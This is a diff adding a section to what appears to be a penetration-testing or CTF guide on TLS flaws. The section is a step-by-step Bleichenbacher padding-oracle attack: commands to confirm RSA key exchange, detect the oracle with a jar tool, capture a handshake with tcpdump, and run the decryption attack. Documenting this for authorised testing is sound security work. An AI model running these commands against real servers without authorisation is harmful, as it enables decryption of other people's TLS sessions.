@@ -104,3 +104,110 @@ If the server supports the vulnerable protocols, use **TLS-Breaker** to verify.
     - `VULNERABILITY_POSSIBLE`: The server accepted the crafted handshake and didn't throw a MAC error where it should have.
         
     - `NOT_VULNERABLE`: The server rejected the connection or correctly handled the padding/MAC check.
+
+### Bleichenbacher Attack — Full Workflow Summary
+
+#### Prerequisites
+
+- Java 11 specifically (not newer)
+- `bleichenbacher-1.0.1.jar`
+- `tcpdump`, `openssl`
+
+---
+
+#### Step 1 — Verify the target uses RSA key exchange
+
+bash
+
+```bash
+echo | openssl s_client -connect <IP>:<PORT> 2>/dev/null | openssl x509 -noout -text | grep -E "Public Key Algorithm|RSA|EC"
+```
+
+You need to see `rsaEncryption`. If you see `id-ecPublicKey` → attack won't work.
+
+---
+
+#### Step 2 — Confirm the oracle exists (vulnerability check)
+
+bash
+
+```bash
+/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
+  -jar apps/bleichenbacher-1.0.1.jar \
+  -connect <IP>:<PORT>
+```
+
+Look for:
+
+```
+Found a behavior difference within the responses. The server could be vulnerable.
+```
+
+If you see that → oracle confirmed, proceed.
+
+---
+
+#### Step 3 — Find which interface routes to the target
+
+bash
+
+```bash
+ip route get <IP>
+```
+
+Output tells you the interface (`dev enp8s0`, `dev tun0`, etc.) — use that in tcpdump.
+
+---
+
+#### Step 4 — Capture a real handshake
+
+**Terminal 1 — start capture first, leave running:**
+
+bash
+
+```bash
+sudo tcpdump -i <INTERFACE> -w capture.pcap host <IP> and port <PORT>
+```
+
+**Terminal 2 — while Terminal 1 is still running:**
+
+bash
+
+```bash
+openssl s_client -connect <IP>:<PORT> -tls1_2 -cipher AES128-SHA
+```
+
+Wait for full session info to appear, then `Ctrl+C` Terminal 1.
+
+Verify you got packets:
+
+```
+~19 packets captured  ← anything >0 is fine
+link-type EN10MB      ← Ethernet, pcap4j parses this correctly
+```
+
+---
+
+#### Step 5 — Execute the attack
+
+bash
+
+```bash
+/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
+  -jar apps/bleichenbacher-1.0.1.jar \
+  -connect <IP>:<PORT> \
+  -pcap capture.pcap \
+  -executeAttack
+```
+
+---
+
+#### Variable reference
+
+|Variable|How to determine it|
+|---|---|
+|`<IP>:<PORT>`|Target address, given by the challenge/scope|
+|`<INTERFACE>`|Run `ip route get <IP>` → look at `dev` field|
+|`-cipher AES128-SHA`|Any `TLS_RSA_*` suite works — RSA key exchange is what matters, not the symmetric cipher|
+|`capture.pcap`|Output filename, your choice|
+|Java 11 path|Run `update-java-alternatives -l` if `/usr/lib/jvm/java-11-openjdk-amd64` doesn't exist|
